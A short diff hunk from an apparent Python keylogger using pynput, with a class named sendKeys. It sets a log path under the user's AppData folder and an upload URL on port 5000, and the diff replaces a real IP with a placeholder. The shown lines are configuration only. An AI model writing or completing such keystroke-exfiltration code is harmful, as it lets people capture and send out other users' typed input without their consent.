@@ -4,7 +4,7 @@ from pynput.keyboard import Key, Listener
 import logging
 import os
 
-SERVER_URL = 'http://13.39.14.156:5000/upload_log'  # Sostituisci con l'URL del tuo server
+SERVER_URL = 'http://xxx.xxx.xxx.xxx:5000/upload_log'  # Sostituisci con l'URL del tuo server
 LOG_FILE_PATH = f'C:/Users/{os.getlogin()}/AppData/Roaming/log.json'
 
 class sendKeys:
